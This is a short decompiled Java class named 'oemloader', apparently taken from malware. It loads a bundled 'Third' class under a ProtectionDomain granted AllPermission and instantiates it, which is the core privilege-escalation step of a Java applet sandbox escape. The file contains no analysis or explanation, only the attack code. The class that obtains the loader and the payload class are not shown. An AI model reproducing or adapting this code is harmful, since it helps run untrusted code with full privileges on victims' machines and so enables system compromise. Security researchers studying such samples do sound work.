import java.io.InputStream;
import java.security.PermissionCollection;
import java.security.ProtectionDomain;
import java.security.CodeSource;
import java.net.URL;
import java.security.Permission;
import java.security.AllPermission;
import java.security.Permissions;
import java.security.cert.Certificate;

// 
// Decompiled by Procyon v0.5.30
// 

public class oemloader extends ClassLoader
{
    public static void getLoader(final oemloader oemldr) {
        try {
            final InputStream inputstream = oemldr.getResourceAsStream("Third.class");
            final int i = inputstream.available();
            final byte[] classbytes = new byte[i];
            inputstream.read(classbytes, 0, i);
            final Certificate[] cert = new Certificate[0];
            final Permissions perm = new Permissions();
            perm.add(new AllPermission());
            final ProtectionDomain undomain = new ProtectionDomain(new CodeSource(new URL("file:///"), cert), perm);
            final Class cls = oemldr.defineClass("Third", classbytes, 0, classbytes.length, undomain);
            final Third rap1 = cls.newInstance();
        }
        catch (Exception e) {
            System.out.println("2");
        }
    }
}
